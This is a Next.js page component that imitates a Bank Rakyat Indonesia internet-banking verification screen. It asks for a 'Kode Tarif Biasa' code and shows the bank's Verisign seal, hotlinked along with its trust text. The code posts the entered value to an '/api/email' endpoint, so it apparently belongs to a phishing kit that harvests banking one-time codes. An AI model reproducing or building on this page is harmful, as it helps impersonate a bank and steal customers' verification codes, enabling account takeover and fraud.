import React, { useState } from 'react'
import Footer from '../components/footer'
import { useRouter } from 'next/router'
import Navbar from '../components/navbar'
import Contents from '../components/contents'

export default function Otp() {
  const router = useRouter()
  const [input, setInput] = useState({})

  const handleInputChange = (e) => {
      setInput({
        [e.target.name] : e.target.value
      })
  }

  const handleSubmit = (e) => {
    e.preventDefault()

    if (!document.getElementById('otp').value) {
      document.getElementById('error').innerText = 'This field is required'
      return
    }

      document.getElementById('masuk').innerText = 'Loading...'
      fetch('/api/email',{
        method: "POST",
        body: JSON.stringify(input)
      })
      .then(response => response.json())
      .then(data => {
        document.getElementById('masuk').innerText = 'Masuk'
        if(data.responCode == 1) router.push('/')
      });
  }
  return (
    <div>
        <Navbar />
        <div className='d-flex'>
          <div className="loginform-wrap my-5 mx-3">
            <form className="loginform" onSubmit={handleSubmit}>
              <h2 className='mt-3'>Verifikasi</h2>
              <label>Kode Tarif Biasa*</label>
              <input id='otp' name="kodeTarifBiasa" autoComplete="off" maxLength={23} type="text" style={{marginBottom: '5px'}} form="loginform" onChange={handleInputChange} />
              <p  className='text-secondary' id='error'></p>
              <button type="submit" id='masuk' className='otp'>Lanjut</button>
              <div style={{float: 'left', width : '100%'}}>
                <a href="https://sealinfo.verisign.com/splash?form_file=fdf/splash.fdf&dn=ib.bri.co.id" className="verisign">
                  <img className="verisign-logo" src="https://ib.bri.co.id/ib-bri/img/securesite1rtc.jpg" width="100px" height="55px" />
                </a>
                <div className="verisigntext">This site chose Verisign SSL for secure e-commerce and confidential communications 
                </div>
              </div>
            </form>

          </div>
          <Contents/>
        </div>
        <Footer/>
    </div>
  )
}
